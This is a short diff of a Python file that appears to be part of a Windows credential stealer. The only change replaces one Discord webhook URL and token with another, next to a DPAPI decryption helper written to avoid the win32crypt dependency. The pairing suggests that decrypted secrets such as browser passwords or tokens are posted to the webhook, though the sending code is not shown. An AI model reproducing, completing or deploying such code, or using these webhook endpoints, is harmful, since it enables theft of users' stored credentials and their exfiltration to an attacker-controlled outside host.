@@ -4,7 +4,7 @@ import ctypes
 from ctypes import wintypes
 
 # Simplified Webhook
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1492247126972043295/YVF2HIWQp4TTBA9743DL9a95n7leOn2QeWHXRekWoyo1Qwj6qOPcUUa3ddIlQGauP6ow'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1492251907832676473/aqwYuwPQWrXACpXM5GCOG7k7XEjC64ZVts9aCLtiM8veasSGO2Ci6uAnxRrxiMogcy84'
 
 # Native Windows DPAPI call to avoid win32crypt dependency
 def dpapi_decrypt(encrypted_bytes):
